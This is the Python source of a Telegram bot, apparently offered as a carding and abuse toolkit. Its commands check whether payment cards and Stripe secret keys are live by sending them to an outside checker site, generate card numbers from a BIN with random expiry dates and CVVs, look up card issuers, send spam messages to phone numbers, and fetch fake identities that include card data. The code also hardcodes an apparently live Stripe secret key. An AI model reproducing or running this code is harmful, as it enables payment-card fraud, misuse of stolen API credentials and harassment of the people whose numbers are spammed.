import requests,user_agent,json,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)


@bot.message_handler(commands=['start'])
def start(message):
	key = types.InlineKeyboardMarkup()
	b1=types.InlineKeyboardButton(text='Channel 📢', url='https://t.me/Freeintrn')
	b2=types.InlineKeyboardButton(text='VIP BOT $', callback_data='vip')
	b3=types.InlineKeyboardButton(text='INFO BOT', callback_data='mo')
	key.row_width = 2
	key.add(b2,b3,b1)
	bot.send_message(message.chat.id,text="*Hello Pro Bot Tools\nHelp To Bot Send *`!help`**",parse_mode='markdown',reply_markup=key)
@bot.message_handler(func= lambda m: True)
def mess(message):
	user = message.from_user.username
	id = message.from_user.id
	msg=message.text
	#===========SK===========#
	if '/sk' in msg:
		try:
			sk = msg.split(' ')[1]
		except:
			pass
		header = {
   'Host': 'grooty.net',
   'Connection': 'keep-alive',
   'Pragma': 'no-cache',
   'Cache-Control': 'no-cache',
   'Accept': '*/*',
   'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.60 Mobile Safari/537.36',
   'X-Requested-With': 'XMLHttpRequest',
   'Referer': 'http://grooty.net/',
   'Accept-Encoding': 'gzip, deflate',
   'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
   'Cookie': f'sk_stored={sk}; checker_theme=light'
}
		chsk = requests.post(f'http://grooty.net/skcheck.php?sk={sk}&referrer=Tikol4Life',headers=header)
		
		if   "DEAD" in chsk.text :
			
			bot.reply_to(message,f"""*❌ DEAD KEY

Key :*`{sk}`*
Response: DEAD SK

 ━━━━━━━━━━━━━
📌 Checked By @{user} (*`{id}`*)
🌐 Checked User Info [Free Check]
🤖 Bot By (@Freeintrn)*""",parse_mode="markdown")
		else:
			bot.reply_to(message,f"""*✅ LIVE KEY

Key: *`{sk}`*
Response: Live

 ━━━━━━━━━━━━━
📌 Checked By @{user} (*`{id}`*) 
🌐 Checked User Info [Free Check]
🤖 Bot By (@Freeintrn)*""",parse_mode="markdown")
	#===========CC==========#
	if '/ch' in msg:
		try:
			cc = msg.split(' ')[1]
		except:
			pass
		header = {
   'Host': 'grooty.net',
   'Connection': 'keep-alive',
   'Pragma': 'no-cache',
   'Cache-Control': 'no-cache',
   'Accept': '*/*',
   'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.60 Mobile Safari/537.36',
   'X-Requested-With': 'XMLHttpRequest',
   'Referer': 'http://grooty.net/',
   'Accept-Encoding': 'gzip, deflate',
   'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
   'Cookie': 'sk_stored=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; checker_theme=light'
}
		r = requests.get(f'http://grooty.net/Stripe_1_New.php?cc_info={cc}&sk=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&referrer=Tikol4Life&telebot=&tele_msg=3',headers=header)
		if "CVV LIVE" in r.text:
			bot.reply_to(message,f"""*✅ LIVE CC
						
CC: *`{cc}`*
━━━━━━━━━━━━━▪︎
Response: Live Cc
━━━━━━━━━━━━━▪︎
📌 Checked By @{user} (*`{id}`*) 
🌐 Checked User Info [Free Check]
🤖 Bot By (@Freeintrn)*""",parse_mode="markdown")
		else:
			bot.reply_to(message,f"""*❌ DEAD CC

CC: *`{cc}`*
━━━━━━━━━━━━━▪︎
Response: Dead Cc
━━━━━━━━━━━━━▪︎
📌 Checked By @{user} (*`{id}`*) 
🌐 Checked User Info [Free Check]
🤖 Bot By (@Freeintrn)*""",parse_mode="markdown")
	
	if '/fack info' in msg:
		r = requests.get('https://m-1.moahmedsalah.repl.co/').json()
		Gender=r['Gender']
		Race=r['Race']
		Birthday=r['Birthday']
		Street=r['Street']
		Mobile=r['Mobile']
		email=r['email']
		HairColor=r['Hair Color']
		CreditCardType=r['Credit Card Type']
		CreditCardNumber=r['Credit Card Number']
		CVV2=r['CVV2']
		Expires=r['Expires']
		bot.reply_to(message,f"""*         RANDOM INFO ✅
━━━━━━━━━━━━━
[+]- Gender: *`{Gender}`*
[+]- Race: *`{Race}`*
[+]- Birthday: *`{Birthday.split('Street')[0]}`*
[+]- Street: *`{Street}`*
[+]- Mobile: *`{Mobile}`*
[+]- email: *`{email}`*
[+]- HairColor: *`{HairColor}`*
[+]- CreditCardType: *`{CreditCardType}`*
[+]- CreditCardNumber: *`{CreditCardNumber}`*
[+]- CVV2: *`{CVV2}`*
[+]- Expires: *`{Expires}`*
━━━━━━━━━━━━━
Checked By @{user} (*`{id}`*)*""",parse_mode='markdown')
	if '/spam' in msg:
		try:
			num = msg.split(' ')[1]
		except:
			pass
		r = requests.get('https://me.moahmedsalah.repl.co/message/?number='+num).json()['send']
		if 'True' in r:
			bot.reply_to(message,text=f"""*SEND SPAM MESSAGE ✅\n\n━━━━━━━━━━━━━\nNumber: *`{num}`*\n━━━━━━━━━━━━━\n\nChecked By @{user} (*`{id}`*)*""",parse_mode="markdown")
		else:
			bot.reply_to(message,f"""*NOT SEND MESSAGE ❌\n\n━━━━━━━━━━━━━\nNumber: *`{num}`*\n━━━━━━━━━━━━━\n\nChecked By @{user} (*`{id}`*)*""",parse_mode="markdown")
	
	if '/bin' in msg:
		if '|' in msg:
			try:
				bin = msg.split(' ')[1]
				bin= bin.split('|')[0]
				bin = bin.split(bin[6])[0]
			except:
				pass
		else:
			try:
				bin = msg.split(' ')[1]
			except:
				pass
			pass
		try:
			r = requests.get('https://bin-checker.net/api/'+bin).json()
			scheme = r['scheme']
			type = r['type']
			level = r['level']
			r1 = r['country']
			code = r1['code']
			c_name = r1['name']
			r2 = r['bank']
			name_bank = r2['name']
			phone = r2['phone']
			bot.reply_to(message,f"""*
(×)- BIN: *`{bin}`*
(×)- Card scheme: *`{scheme}`*
(×)- Card Type: *`{type}`*
(×)- Card Level: *`{level}`*
(×)- Bank Name: *`{name_bank}`*
(×)- Country Code: *`{code}`* 
(×)- Country Name: *`{c_name}`* 
(×)- Phone Number: *`{phone}`*
 ━━━━━━━━━━━━━
📌 Checked By @{user} (*`{id}`*)*""",parse_mode="markdown")

		except:
			bot.reply_to(message,f"*❌ ERROR BIN\nPLEASE  SEND !help *",parse_mode="markdown")
			
	if '/gen' in msg:
		try:
			gen = msg.split(' ')[1]
		except:pass
		user1 = '1234567890'
		try:
			chbin = gen.split(gen[1])[0]
		except:
			pass
		if '3' in chbin:
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa1 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa2 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa3 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa4 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa5 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa6 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa7 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa8 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa9 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(4))))
			visa10 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			bot.reply_to(message,f"*GENRATE TRUE\n\n━━━━━━━━━━━━━\n*`{visa}\n{visa1}\n{visa2}\n{visa3}\n{visa4}\n{visa5}\n{visa6}\n{visa7}\n{visa8}\n{visa9}\n{visa10}`*\n━━━━━━━━━━━━━\n📌 Checked By @{user} (*`{id}`*)*",parse_mode="markdown")
		else:
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa1 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa2 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa3 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa4 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa5 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa6 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa7 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa8 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa9 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			us = str(''.join((random.choice(user1) for i in range(10))))
			us1 = str(''.join((random.choice(user1) for i in range(2))))
			us2 = str(''.join((random.choice(user1) for i in range(1))))
			us4 = str(''.join((random.choice(user1) for i in range(1))))
			us3 = str(''.join((random.choice(user1) for i in range(3))))
			visa10 = gen+us+"|"+"0"+us2+"|"+"202"+us4+"|"+us3
			bot.reply_to(message,f"*GENRATE TRUE\n\n━━━━━━━━━━━━━\n*`{visa}\n{visa1}\n{visa2}\n{visa3}\n{visa4}\n{visa5}\n{visa6}\n{visa7}\n{visa8}\n{visa9}\n{visa10}`*\n━━━━━━━━━━━━━\n📌 Checked By @{user} (*`{id}`*)*",parse_mode="markdown")
	if '!help' in msg:
		bot.reply_to(message,f"*CHECKER BIN >> /bin bin\n━━━━━━━━━━━━━▪︎\nCHECKER INTSAUP >> /coin id\n━━━━━━━━━━━━━▪︎\nGENRATE VISA >> /gen bin\n━━━━━━━━━━━━━▪︎\nSPAM EGYPT >> /spam number\n━━━━━━━━━━━━━▪︎\nFACK INFO >> /fack info \n━━━━━━━━━━━━━▪︎\nCHECKER CC >> /ch Cc \n━━━━━━━━━━━━━▪︎\nCHECKER SK >>  /sk sk \n*",parse_mode="markdown")
	
	
	if '/coin' in msg:
		try:
			id = msg.split(' ')[1]
			pass
		except:
			pass
		import bs4
		r = requests.get('https://insta-up-v2.moahmedsalah.repl.co/?oid='+id+'&submit=submit',headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','referer':'https://insta-up-v2.moahmedsalah.repl.co','accept-encoding': 'gzip, deflate, br','accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7'})
		soup = bs4.BeautifulSoup(r.content, "html.parser")
		try:
			coin= soup.find(color='red').text
			coin = coin.split('-')[1]
			coin= coin.split(':')[1]
			coin = coin.split('"')[1]
			bot.reply_to(message,f"*CHECK TRUE ✅\n\n━━━━━━━━━━━━━\nId >> 8*`{id}`*\nCoin >> *`{coin}`*\n━━━━━━━━━━━━━\n📌 Checked By @{user} (*`{id}`*)*",parse_mode="markdown")
		except:
			bot.reply_to(message,f"*CHECK FALSE ❌\n\n━━━━━━━━━━━━━\nId >> 8*`{id}`*\n━━━━━━━━━━━━━\n📌 Checked By @{user} (*`{id}`*)*",parse_mode="markdown")
	
					
	if '/key' in msg:
		file_key = 'MBASBQO19WJHWIEI9' 
		key = msg.split(' ')[1]
		if file_key in key:
			bot.send_message(message.chat.id,"Hello Pro Bot Vip Key")
			
		else:
			pass
	else:
		pass
@bot.callback_query_handler(func=lambda call: True)
def qery(call):
	if call.data == 'vip':
	  vip(call.message)
	if call.data == 'back':
	  start1(call.message)
	if call.data == 'mo':
	  s(call.message)
	 
def s(message):
	mohamed_salah_bot1 = types.InlineKeyboardMarkup(row_width=2)
	ener2 = types.InlineKeyboardButton(f"BACK",callback_data='back')
	mohamed_salah_bot1.add(ener2)
	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*CHECKER BIN >> /bin bin\n━━━━━━━━━━━━━▪︎\nCHECKER INTSAUP >> /coin id\n━━━━━━━━━━━━━▪︎\nGENRATE VISA >> /gen bin\n━━━━━━━━━━━━━▪︎\nSPAM EGYPT >> /spam number\n━━━━━━━━━━━━━▪︎\nFACK INFO >> /fack info \n━━━━━━━━━━━━━▪︎\nCHECKER CC >> /ch Cc \n━━━━━━━━━━━━━▪︎\nCHECKER SK >>  /sk sk \n*",parse_mode='markdown',reply_markup=mohamed_salah_bot1)
#===========vip=======#
def vip(message):
	mohamed_salah_bot1 = types.InlineKeyboardMarkup(row_width=2)
	ener2 = types.InlineKeyboardButton(f"BACK",callback_data='back')
	mohamed_salah_bot1.add(ener2)
	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*SOON VIP IN BOT*",parse_mode='markdown',reply_markup=mohamed_salah_bot1)
def start1(message):
	key = types.InlineKeyboardMarkup()
	b1=types.InlineKeyboardButton(text='Channel 📢', url='https://t.me/Freeintrn')
	b2=types.InlineKeyboardButton(text='VIP BOT $', callback_data='vip')
	b3=types.InlineKeyboardButton(text='INFO BOT', callback_data='mo')
	key.row_width = 2
	key.add(b2,b3,b1)
	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hello Pro Bot Tools\nHelp To Bot Send *`!help`**",parse_mode='markdown',reply_markup=key)
		

@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://mdkkdkdkdkdkjd.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
